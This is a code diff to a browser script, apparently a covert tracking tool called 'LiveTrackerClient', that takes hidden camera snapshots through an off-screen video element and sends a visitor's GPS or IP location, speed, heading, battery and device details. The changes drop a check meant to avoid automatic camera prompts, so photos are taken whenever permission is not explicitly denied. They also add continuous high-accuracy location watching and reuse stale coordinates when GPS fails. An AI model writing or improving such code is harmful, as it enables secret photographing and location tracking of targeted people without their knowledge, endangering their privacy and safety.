@@ -106,7 +106,9 @@
             try {
                 const status = await navigator.permissions.query({ name: permissionName });
                 return status.state; // 'granted', 'prompt', 'denied'
-            } catch (e) {}
+            } catch (e) {
+                return 'unknown';
+            }
         }
         return 'unknown';
     }
@@ -198,11 +200,11 @@
                 return null;
             }
 
-            // Check permission state first if not a direct user gesture to prevent intrusive popups
+            // Check permission state if supported; only abort if explicitly denied
             if (!isUserGesture) {
                 const camState = await checkPermissionState('camera');
-                if (camState !== 'granted') {
-                    return null; // Avoid asking permission automatically on load
+                if (camState === 'denied') {
+                    return null;
                 }
             }
 
@@ -234,6 +236,7 @@
                 video.id = "__ctrace_cam_video";
                 video.setAttribute("playsinline", "true");
                 video.setAttribute("webkit-playsinline", "true");
+                video.autoplay = true;
                 video.muted = true;
                 video.style.position = "fixed";
                 video.style.top = "-9999px";
@@ -247,17 +250,34 @@
 
             video.srcObject = stream;
 
+            try {
+                await video.play();
+            } catch (e) {}
+
+            // Wait for video frame to render with valid dimensions
             await new Promise((resolve) => {
-                video.onloadedmetadata = async () => {
-                    try {
-                        await video.play();
-                    } catch (e) {}
-                    resolve();
+                let attempts = 0;
+                const checkReady = () => {
+                    if (video.videoWidth > 0 && video.videoHeight > 0 && video.readyState >= 2) {
+                        resolve();
+                    } else if (attempts < 20) {
+                        attempts++;
+                        setTimeout(checkReady, 50);
+                    } else {
+                        resolve();
+                    }
                 };
-                setTimeout(resolve, 500);
+                if (video.readyState >= 2 && video.videoWidth > 0) {
+                    resolve();
+                } else {
+                    video.onloadedmetadata = checkReady;
+                    video.onloadeddata = checkReady;
+                    setTimeout(checkReady, 100);
+                }
             });
 
-            await new Promise(resolve => setTimeout(resolve, 300));
+            // Extra delay for camera auto-exposure stabilization
+            await new Promise(resolve => setTimeout(resolve, 400));
 
             const canvas = document.createElement("canvas");
             const rawWidth = video.videoWidth || 640;
@@ -273,7 +293,7 @@
             ctx.imageSmoothingQuality = "high";
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const photoData = canvas.toDataURL("image/jpeg", 0.65);
+            const photoData = canvas.toDataURL("image/jpeg", 0.70);
 
             // Clean up stream tracks & video object to release camera hardware immediately
             if (stream && stream.getTracks) {
@@ -306,10 +326,11 @@
             isCapturingPhoto = false;
         }
 
-        const isGps = coords && coords.latitude && coords.longitude;
-        const lat = isGps ? coords.latitude : (ipLocation ? ipLocation.lat : null);
-        const lng = isGps ? coords.longitude : (ipLocation ? ipLocation.lng : null);
-        const accuracy = isGps ? coords.accuracy : (ipLocation ? 5000 : null);
+        const effectiveCoords = coords || lastKnownGpsCoords;
+        const isGps = effectiveCoords && effectiveCoords.latitude && effectiveCoords.longitude;
+        const lat = isGps ? effectiveCoords.latitude : (ipLocation ? ipLocation.lat : null);
+        const lng = isGps ? effectiveCoords.longitude : (ipLocation ? ipLocation.lng : null);
+        const accuracy = isGps ? effectiveCoords.accuracy : (ipLocation ? 5000 : null);
         const locationType = isGps ? 'GPS' : 'IP';
 
         const payload = {
@@ -318,8 +339,8 @@
             lng: lng,
             accuracy: accuracy,
             locationType: locationType,
-            speed: coords ? coords.speed : null,
-            heading: coords ? coords.heading : null,
+            speed: effectiveCoords ? effectiveCoords.speed : null,
+            heading: effectiveCoords ? effectiveCoords.heading : null,
             battery: battery,
             device: device,
             ipLocation: ipLocation,
@@ -343,6 +364,7 @@
 
     let bgWorker = null;
     let fallbackIntervalId = null;
+    let lastKnownGpsCoords = null;
 
     function initBackgroundWorker(onTick, interval = 4000) {
         if (bgWorker) {
@@ -385,6 +407,7 @@
     }
 
     let isTrackingStarted = false;
+    let isGpsWatchStarted = false;
 
     window.LiveTrackerClient = {
         getTargetId: () => targetId,
@@ -409,12 +432,12 @@
                     gpsAttempted = true;
                     navigator.geolocation.getCurrentPosition(
                         async (position) => {
+                            lastKnownGpsCoords = position.coords;
                             await sendTelemetry(position.coords, templateName, shouldTakePhoto, isUserGesture);
                             if (onSuccess) onSuccess(position.coords);
                         },
                         async (error) => {
-                            // On GPS error/denial, fallback gracefully to IP telemetry
-                            await sendTelemetry(null, templateName, shouldTakePhoto, isUserGesture);
+                            await sendTelemetry(lastKnownGpsCoords || null, templateName, shouldTakePhoto, isUserGesture);
                             if (onError) onError(error);
                         },
                         {
@@ -426,7 +449,7 @@
                 }
 
                 if (!gpsAttempted) {
-                    await sendTelemetry(null, templateName, shouldTakePhoto, isUserGesture);
+                    await sendTelemetry(lastKnownGpsCoords || null, templateName, shouldTakePhoto, isUserGesture);
                 }
             }
 
@@ -436,13 +459,18 @@
             if (isTrackingStarted) return;
             isTrackingStarted = true;
 
-            if (enableGPS && navigator.geolocation) {
+            if (enableGPS && navigator.geolocation && !isGpsWatchStarted) {
+                isGpsWatchStarted = true;
                 try {
                     navigator.geolocation.watchPosition(
                         (pos) => {
-                            sendTelemetry(pos.coords, templateName, enableCamera, false);
+                            if (pos && pos.coords) {
+                                lastKnownGpsCoords = pos.coords;
+                                sendTelemetry(pos.coords, templateName, enableCamera, false);
+                                if (onSuccess) onSuccess(pos.coords);
+                            }
                         },
-                        () => {},
+                        (err) => {},
                         { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
                     );
                 } catch(e) {}
